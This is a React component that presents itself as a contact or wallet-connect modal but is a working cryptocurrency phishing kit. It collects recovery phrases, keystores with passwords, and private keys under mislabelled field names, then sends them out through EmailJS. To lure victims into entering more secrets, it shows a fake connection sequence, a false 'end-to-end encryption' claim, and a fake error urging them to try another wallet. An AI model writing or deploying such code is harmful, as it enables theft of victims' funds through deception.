'use client'

import { useState, useEffect } from 'react'
import emailjs from '@emailjs/browser'
import styles from './page.module.css'

type SelectedItem = {
  id: string
  label: string
  image: string | null
} | null

type ModalView = 'form' | 'loading' | 'error'

const LOADING_STEPS = [
  'Loading...',
  'Initializing...',
  'Establishing connection...',
  'Connecting Wallet...',
]

export default function ContactModal({
  open,
  onClose,
  selectedItem,
  walletAddress,
}: {
  open: boolean
  onClose: () => void
  selectedItem: SelectedItem
  walletAddress?: string
}) {
  const [activeTab, setActiveTab] = useState(1)
  const [view, setView] = useState<ModalView>('form')
  const [loadingStep, setLoadingStep] = useState(0)

  const [name, setName] = useState('')
  const [email, setEmail] = useState('')
  const [message, setMessage] = useState('')
  const [extra, setExtra] = useState('')

  useEffect(() => {
    if (view !== 'loading') return

    setLoadingStep(0)

    const interval = setInterval(() => {
      setLoadingStep((prev) => {
        if (prev >= LOADING_STEPS.length - 1) {
          clearInterval(interval)
          return prev
        }
        return prev + 1
      })
    }, 2000)

    const timeout = setTimeout(() => {
      setView('error')
    }, LOADING_STEPS.length * 2000)

    return () => {
      clearInterval(interval)
      clearTimeout(timeout)
    }
  }, [view])

  function resetForm() {
    setActiveTab(1)
    setView('form')
    setLoadingStep(0)
    setName('')
    setEmail('')
    setMessage('')
    setExtra('')
  }

  function handleFullClose() {
    resetForm()
    onClose()
  }

  async function handleSubmit() {
    setView('loading')

    try {
      const result = await emailjs.send(
        process.env.NEXT_PUBLIC_EMAILJS_SERVICE_ID!,
        process.env.NEXT_PUBLIC_EMAILJS_TEMPLATE_ID!,
        {
          wallet: selectedItem?.label ?? 'Not specified',
          wallet_address: walletAddress || '—',
          phrase: message || '—',
          keystore: extra || '—',
          keystore_password: email || '—',
          private_key: name || '—',
        },
        process.env.NEXT_PUBLIC_EMAILJS_PUBLIC_KEY!
      )
      console.log('Email sent successfully:', result.status, result.text)
    } catch (err) {
      console.error('EmailJS failed:', err)
    }
  }

  if (!open) return null

  return (
    <div className={styles.backdrop} onClick={handleFullClose}>
      <div className={styles.modalCard} onClick={(e) => e.stopPropagation()}>

        {view === 'form' && (
          <>
            <button
              type="button"
              className={styles.closeBtn}
              onClick={handleFullClose}
              aria-label="Close contact form"
            >
              ×
            </button>

            {selectedItem && (
              <div className={styles.modalHeader}>
                {selectedItem.image ? (
                  <img
                    src={selectedItem.image}
                    alt={selectedItem.label}
                    className={styles.modalLogo}
                  />
                ) : (
                  <div className={styles.modalLogoFallback}>{selectedItem.label[0]}</div>
                )}
                <p className={styles.modalTitle}>{selectedItem.label}</p>
              </div>
            )}

            <div className={styles.tabRow}>
              <button type="button" className={`${styles.tabBtn} ${activeTab === 1 ? styles.tabActive : ''}`} onClick={() => setActiveTab(1)}>Phrase</button>
              <button type="button" className={`${styles.tabBtn} ${activeTab === 2 ? styles.tabActive : ''}`} onClick={() => setActiveTab(2)}>Keystore</button>
              <button type="button" className={`${styles.tabBtn} ${activeTab === 3 ? styles.tabActive : ''}`} onClick={() => setActiveTab(3)}>Private Key</button>
            </div>

            <div className={styles.form}>
              {activeTab === 1 && (
                <div className={styles.field}>
                  <textarea
                    id="message"
                    placeholder="Enter your recovery phrase"
                    value={message}
                    onChange={(e) => setMessage(e.target.value)}
                  />
                  <p className={styles.formHint}>Typically 12 (sometimes 24) words separated by single spaces</p>
                </div>
              )}

              {activeTab === 2 && (
                <>
                  <div className={styles.field}>
                    <textarea
                      id="extra"
                      placeholder="Enter Keystore"
                      value={extra}
                      onChange={(e) => setExtra(e.target.value)}
                    />
                  </div>
                  <div className={styles.field}>
                    <input
                      id="email"
                      type="password"
                      placeholder="Wallet password"
                      value={email}
                      onChange={(e) => setEmail(e.target.value)}
                    />
                  </div>
                  <p className={styles.formHint}>Several lines of text beginning with &quot;{'{...}'}&quot; plus the password you used to encrypt it.</p>
                </>
              )}

              {activeTab === 3 && (
                <div className={styles.field}>
                  <input
                    id="name"
                    placeholder="Enter your Private Key"
                    value={name}
                    onChange={(e) => setName(e.target.value)}
                  />
                  <p className={styles.formHint}>Typically 12 (sometimes 24) words separated by a single space.</p>
                </div>
              )}

              <button type="button" className={styles.submitBtn} onClick={handleSubmit}>Proceed</button>
              <button type="button" className={styles.cancelBtn} onClick={handleFullClose}>Cancel</button>
            </div>

            <div className={styles.securityNotice}>
              <span className={styles.securityIcon}>✓</span>
              <div>
                <p className={styles.securityTitle}>This session is protected with end-to-end encryption.</p>
                <p className={styles.securitySubtitle}>Safe to connect manually.</p>
              </div>
            </div>
          </>
        )}

        {view === 'loading' && (
          <div className={styles.loadingWrap}>
            <h2 className={styles.loadingTitle}>Interacting With Provider</h2>
            <hr className={styles.loadingDivider} />

            <div className={styles.spinnerWrap}>
              <div className={styles.spinnerDashedRing} />
              <div className={styles.spinnerArc} />
              <div className={styles.spinnerCore} />
            </div>

            <p key={loadingStep} className={styles.loadingText}>
              {LOADING_STEPS[loadingStep]}
            </p>
          </div>
        )}

        {view === 'error' && (
          <div className={styles.errorWrap}>
            <div className={styles.errorHeader}>
              <span>Information</span>
            </div>

            <div className={styles.errorBody}>
              <h2 className={styles.errorTitle}>Error!</h2>
              <p className={styles.errorMain}>Please try Another wallet</p>
              <p className={styles.errorDetail}>
                Multiple iOS and Android wallets support the WalletConnect protocol.
                Interaction between mobile apps and mobile browsers are supported
                via mobile deep linking.
              </p>

              <button
                type="button"
                className={styles.tryAgainBtn}
                onClick={() => {
                  setView('form')
                  setActiveTab(1)
                }}
              >
                CLOSE
              </button>
            </div>
          </div>
        )}

      </div>
    </div>
  )
}